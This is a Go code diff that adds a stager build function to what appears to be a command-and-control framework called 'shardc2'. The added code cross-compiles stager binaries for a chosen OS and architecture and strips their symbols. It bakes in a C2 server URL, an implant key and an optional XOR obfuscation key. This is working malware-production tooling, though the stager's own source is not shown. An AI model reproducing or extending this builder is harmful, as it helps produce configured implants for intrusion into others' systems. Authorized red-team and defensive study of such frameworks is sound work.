@@ -79,3 +79,64 @@ func (b *LocalBuilder) Build(ctx context.Context, req Request) (Artifact, error)
 
 	return Artifact{Path: outPath, Status: models.BuildStatusCompleted}, nil
 }
+
+type StagerRequest struct {
+	GOOS       string `json:"goos"`
+	GOARCH     string `json:"goarch"`
+	StageID    string `json:"stage_id"`
+	ServerURL  string `json:"server_url"`
+	ImplantKey string `json:"implant_key"`
+	XORKey     string `json:"xor_key"`
+}
+
+func (r StagerRequest) Validate() error {
+	if !models.AllowedGOOS[r.GOOS] {
+		return fmt.Errorf("unsupported GOOS %q", r.GOOS)
+	}
+	if !models.AllowedGOARCH[r.GOARCH] {
+		return fmt.Errorf("unsupported GOARCH %q", r.GOARCH)
+	}
+	if r.StageID == "" {
+		return fmt.Errorf("stage_id is required")
+	}
+	if r.ServerURL == "" {
+		return fmt.Errorf("server_url is required")
+	}
+	return nil
+}
+
+func (b *LocalBuilder) BuildStager(ctx context.Context, req StagerRequest) (Artifact, error) {
+	if err := req.Validate(); err != nil {
+		return Artifact{Status: models.BuildStatusFailed, Error: err.Error()}, err
+	}
+
+	outDir := filepath.Join(b.repoRoot, "bin", "builds")
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return Artifact{Status: models.BuildStatusFailed, Error: err.Error()}, fmt.Errorf("create build dir: %w", err)
+	}
+
+	suffix := ""
+	if req.GOOS == "windows" {
+		suffix = ".exe"
+	}
+	outName := fmt.Sprintf("shardc2-stager-%s-%s-%d%s", req.GOOS, req.GOARCH, time.Now().UnixMilli(), suffix)
+	outPath := filepath.Join(outDir, outName)
+
+	ldflags := fmt.Sprintf("-s -w -X main.buildServerURL=%s -X main.buildStageID=%s -X main.buildImplantKey=%s",
+		req.ServerURL, req.StageID, req.ImplantKey)
+	if req.XORKey != "" {
+		ldflags += " -X main.buildXORKey=" + req.XORKey
+	}
+
+	cmd := exec.CommandContext(ctx, "go", "build", "-ldflags", ldflags, "-o", outPath, "./cmd/stager")
+	cmd.Dir = b.repoRoot
+	cmd.Env = append(os.Environ(), "GOOS="+req.GOOS, "GOARCH="+req.GOARCH, "CGO_ENABLED=0")
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		errMsg := fmt.Sprintf("stager build failed: %s: %v", string(output), err)
+		return Artifact{Status: models.BuildStatusFailed, Error: errMsg}, fmt.Errorf("%s", errMsg)
+	}
+
+	return Artifact{Path: outPath, Status: models.BuildStatusCompleted}, nil
+}
